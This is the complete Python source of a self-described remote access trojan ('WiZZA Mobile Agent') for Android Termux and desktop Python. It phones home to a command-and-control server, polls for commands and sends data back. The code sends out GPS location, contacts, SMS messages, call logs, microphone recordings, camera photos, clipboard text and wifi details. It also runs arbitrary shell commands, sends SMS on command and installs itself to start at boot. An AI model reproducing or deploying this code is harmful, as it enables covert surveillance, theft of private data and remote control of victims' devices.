#!/usr/bin/env python3
"""
WiZZA Mobile Agent — Python RAT
Runs on Android (via Termux + termux-api) or any Python environment.
Phones back to WiZZA C2, polls for commands, exfiltrates data.

On Android install:
  pkg install python termux-api && pip install requests

On desktop (testing): python3 mobile_agent.py

C2 URL and build key are baked by 'start payload' or 'start mobile'.
"""

import os, sys, time, json, uuid, socket, platform
import subprocess, threading, base64, tempfile, hashlib

# ── Bake-time constants (replaced by builder) ─────────────────────────
C2_PRIMARY   = "__C2URL__"
C2_FALLBACK  = ""
BUILD_KEY    = "__BUILD_KEY__"
AGENT_ID     = str(uuid.uuid4())[:8]
POLL_SECONDS = 20

# ── Termux API helpers ────────────────────────────────────────────────
def _termux(cmd: list[str], timeout: int = 10) -> dict | None:
    """Run a termux-api command and return parsed JSON output."""
    try:
        result = subprocess.run(
            ["termux-" + cmd[0]] + cmd[1:],
            capture_output=True, text=True, timeout=timeout
        )
        if result.stdout.strip():
            return json.loads(result.stdout)
    except Exception:
        pass
    return None

def is_termux() -> bool:
    return os.path.exists("/data/data/com.termux")

# ── Device fingerprint ────────────────────────────────────────────────
def device_info() -> dict:
    info = {
        "agent_id": AGENT_ID,
        "platform": platform.system(),
        "hostname": socket.gethostname(),
        "arch":     platform.machine(),
        "python":   platform.python_version(),
        "cwd":      os.getcwd(),
        "user":     os.environ.get("USER", "unknown"),
        "termux":   is_termux(),
    }
    if is_termux():
        props = _termux(["device-info"])
        if props:
            info["device_manufacturer"] = props.get("manufacturer", "")
            info["device_model"]        = props.get("model", "")
            info["android_version"]     = props.get("release", "")
    return info

# ── Data collection ───────────────────────────────────────────────────
def get_gps() -> dict:
    if is_termux():
        data = _termux(["location", "--provider", "gps"], timeout=30)
        if data:
            return {"type": "gps", "lat": data.get("latitude"), "lng": data.get("longitude"),
                    "alt": data.get("altitude"), "acc": data.get("accuracy")}
    # Fallback: IP-based geolocation
    try:
        import urllib.request
        with urllib.request.urlopen("https://ipapi.co/json/", timeout=5) as r:
            j = json.loads(r.read())
            return {"type": "gps_ip", "lat": j.get("latitude"), "lng": j.get("longitude"),
                    "city": j.get("city"), "country": j.get("country_name"), "ip": j.get("ip")}
    except Exception:
        return {}

def get_contacts() -> list:
    if is_termux():
        data = _termux(["contact-list"])
        if data:
            return [{"name": c.get("name"), "phone": c.get("number")} for c in data[:50]]
    return []

def get_sms() -> list:
    if is_termux():
        data = _termux(["sms-list", "-l", "50"])
        if data:
            return [{"from": m.get("sender"), "body": m.get("body"), "ts": m.get("received")}
                    for m in data[:50]]
    return []

def get_call_log() -> list:
    if is_termux():
        data = _termux(["call-log", "-l", "30"])
        if data:
            return [{"number": c.get("name") or c.get("number"), "type": c.get("type"),
                     "duration": c.get("duration"), "ts": c.get("date")} for c in data[:30]]
    return []

def record_mic(seconds: int = 10) -> str | None:
    """Record audio, return base64 WAV."""
    if is_termux():
        with tempfile.NamedTemporaryFile(suffix=".m4a", delete=False) as f:
            tmp = f.name
        result = subprocess.run(
            ["termux-microphone-record", "-l", str(seconds), "-f", tmp],
            capture_output=True, timeout=seconds + 5
        )
        if os.path.exists(tmp):
            with open(tmp, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            os.unlink(tmp)
            return data
    return None

def take_photo(camera: str = "front") -> str | None:
    """Take a photo, return base64 JPEG."""
    if is_termux():
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
            tmp = f.name
        idx = "1" if camera == "front" else "0"
        subprocess.run(
            ["termux-camera-photo", "-c", idx, tmp],
            capture_output=True, timeout=15
        )
        if os.path.exists(tmp) and os.path.getsize(tmp) > 0:
            with open(tmp, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            os.unlink(tmp)
            return data
    return None

def get_clipboard() -> str:
    if is_termux():
        data = _termux(["clipboard-get"])
        if data:
            return str(data)
    return ""

def list_files(path: str = "/sdcard") -> list:
    try:
        return os.listdir(path)
    except Exception:
        return []

def shell_exec(cmd: str) -> str:
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        return (result.stdout + result.stderr).strip()
    except Exception as e:
        return str(e)

def get_wifi_info() -> dict:
    if is_termux():
        data = _termux(["wifi-connectioninfo"])
        if data:
            return {"ssid": data.get("ssid"), "bssid": data.get("bssid"),
                    "ip": data.get("ip"), "freq": data.get("frequency_mhz")}
    return {}

def send_sms(number: str, text: str) -> bool:
    if is_termux():
        r = subprocess.run(
            ["termux-sms-send", "-n", number, text],
            capture_output=True, timeout=15
        )
        return r.returncode == 0
    return False

# ── C2 communication ──────────────────────────────────────────────────
class C2Client:
    def __init__(self, base_url: str):
        self.base  = base_url.rstrip("/")
        self.token = hashlib.sha256(BUILD_KEY.encode()).hexdigest()[:16]
        self.headers = {
            "User-Agent":   "Mozilla/5.0 (Linux; Android 13)",
            "X-Agent-ID":   AGENT_ID,
            "X-Token":      self.token,
            "Content-Type": "application/json",
        }

    def _req(self, method: str, path: str, data: dict = None) -> dict | None:
        import urllib.request, urllib.error
        url = f"{self.base}{path}"
        body = json.dumps(data or {}).encode()
        req = urllib.request.Request(url, data=body, headers=self.headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                return json.loads(r.read())
        except urllib.error.HTTPError as e:
            return {"error": e.code}
        except Exception:
            return None

    def register(self) -> bool:
        resp = self._req("POST", "/mobile/register", {
            "agent_id": AGENT_ID,
            "info":     device_info(),
        })
        return bool(resp and resp.get("ok"))

    def poll(self) -> dict | None:
        return self._req("GET", f"/mobile/cmd?aid={AGENT_ID}")

    def send(self, data: dict):
        self._req("POST", "/mobile/data", {"aid": AGENT_ID, "payload": data})


# ── Command dispatcher ────────────────────────────────────────────────
def handle_command(c2: C2Client, cmd: str, args: dict):
    if cmd == "gps":
        c2.send(get_gps())
    elif cmd == "contacts":
        c2.send({"type": "contacts", "data": get_contacts()})
    elif cmd == "sms":
        c2.send({"type": "sms", "data": get_sms()})
    elif cmd == "calls":
        c2.send({"type": "calls", "data": get_call_log()})
    elif cmd == "mic":
        dur = int(args.get("duration", 10))
        data = record_mic(dur)
        if data:
            c2.send({"type": "mic", "data": data, "fmt": "m4a"})
    elif cmd == "camera":
        face = args.get("camera", "front")
        data = take_photo(face)
        if data:
            c2.send({"type": "camera", "data": data, "fmt": "jpg"})
    elif cmd == "clipboard":
        txt = get_clipboard()
        c2.send({"type": "clipboard", "data": txt})
    elif cmd == "ls":
        path = args.get("path", "/sdcard")
        files = list_files(path)
        c2.send({"type": "ls", "path": path, "files": files})
    elif cmd == "shell":
        out = shell_exec(args.get("cmd", "id"))
        c2.send({"type": "shell_result", "output": out})
    elif cmd == "wifi":
        c2.send({"type": "wifi", "data": get_wifi_info()})
    elif cmd == "sms_send":
        ok = send_sms(args.get("to", ""), args.get("text", ""))
        c2.send({"type": "sms_sent", "ok": ok})
    elif cmd == "info":
        c2.send({"type": "info", "data": device_info()})
    elif cmd == "interval":
        global POLL_SECONDS
        POLL_SECONDS = int(args.get("seconds", 20))
    elif cmd == "exit":
        sys.exit(0)


# ── Persistence ───────────────────────────────────────────────────────
def install_persistence():
    """Add self to startup via crontab @reboot or Termux boot."""
    self_path = os.path.abspath(sys.argv[0])

    if is_termux():
        # Termux:Boot script
        boot_dir = os.path.expanduser("~/.termux/boot")
        os.makedirs(boot_dir, exist_ok=True)
        boot_script = os.path.join(boot_dir, "wizza_agent.sh")
        with open(boot_script, "w") as f:
            f.write(f"#!/data/data/com.termux/files/usr/bin/bash\n")
            f.write(f"python3 {self_path} &\n")
        os.chmod(boot_script, 0o755)
    else:
        # Crontab @reboot
        try:
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            existing = result.stdout if result.returncode == 0 else ""
            entry = f"@reboot python3 {self_path} > /dev/null 2>&1 &\n"
            if self_path not in existing:
                new_cron = existing + entry
                proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
                proc.communicate(new_cron.encode())
        except Exception:
            pass


# ── Main loop ─────────────────────────────────────────────────────────
def main():
    # Try primary C2, fall back if needed
    c2_url = C2_PRIMARY
    if not c2_url or "__C2URL__" in c2_url:
        print("[-] Agent not baked — run: start payload")
        sys.exit(1)

    c2 = C2Client(c2_url)

    # Register
    for attempt in range(5):
        if c2.register():
            break
        if C2_FALLBACK and "__" not in C2_FALLBACK:
            c2 = C2Client(C2_FALLBACK)
            if c2.register():
                break
        time.sleep(10 * (attempt + 1))

    # Persistence
    try:
        install_persistence()
    except Exception:
        pass

    # Send initial data burst
    threading.Thread(target=lambda: [
        c2.send({"type": "info", "data": device_info()}),
        c2.send(get_gps()),
        c2.send({"type": "wifi", "data": get_wifi_info()}),
    ], daemon=True).start()

    # Poll loop
    while True:
        try:
            resp = c2.poll()
            if resp and resp.get("cmd"):
                threading.Thread(
                    target=handle_command,
                    args=(c2, resp["cmd"], resp.get("args", {})),
                    daemon=True
                ).start()
        except Exception:
            pass
        time.sleep(POLL_SECONDS)


if __name__ == "__main__":
    main()
